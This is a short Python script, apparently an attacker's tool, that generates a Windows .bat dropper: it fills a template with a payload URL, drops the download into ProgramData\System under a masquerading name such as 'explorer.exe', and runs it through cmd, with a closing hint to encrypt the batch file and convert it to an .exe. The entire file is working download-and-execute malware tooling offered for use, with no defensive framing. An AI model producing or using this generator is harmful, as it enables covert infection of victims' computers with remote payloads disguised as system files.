import argparse

parser = argparse.ArgumentParser(description="create a .bat file that download the payload file from via http and run it via cmd, coded by: @TSuNAmi_ORg")
parser.add_argument('-u', type=str, required=True, help="payload file url, ex: http://192.168.1.5:8080/payload.exe", dest='url', metavar="[http://url]")
parser.add_argument('-d', type=str, required=True, help="output file name for downloading, ex: explorer.exe (.exe extension)", dest='downloading_output', metavar="<explorer.exe>")
parser.add_argument('-o', type=str, required=True, help="output file name, ex: output.bat (.bat extension)", dest='output', metavar="<output.bat>")
args = parser.parse_args()

url = args.url
output = args.output
downloading_output = args.downloading_output

if(url is not None and downloading_output is not None and output is not None):
    def read_source():
        source = open("source.bat", "rt")
        data = source.read()
        source.close()
        return data

    def main():
        source = read_source()

        new_url = source.replace('set "url="', 'set "url=' + url + '"')
        new_downloading_output = new_url.replace('"outputFile=%systemdrive%\ProgramData\System\\"', '"outputFile=%systemdrive%\ProgramData\System\\' + downloading_output + '"')
        command = new_downloading_output.replace('"cmd /c  lol"', '"cmd /c ' + "%systemdrive%\ProgramData\System\\" + downloading_output + " lol" + '"')

        nfb = open(output, "w+")
        nfb.write(command)
        nfb.close()

        print("output file: {output}".format(output = output))
        print("hint: encrypt it and convert it to .exe file (;")

    if __name__ == "__main__":
        main()
else:
    print("help: python <salt4attack.py> -h")
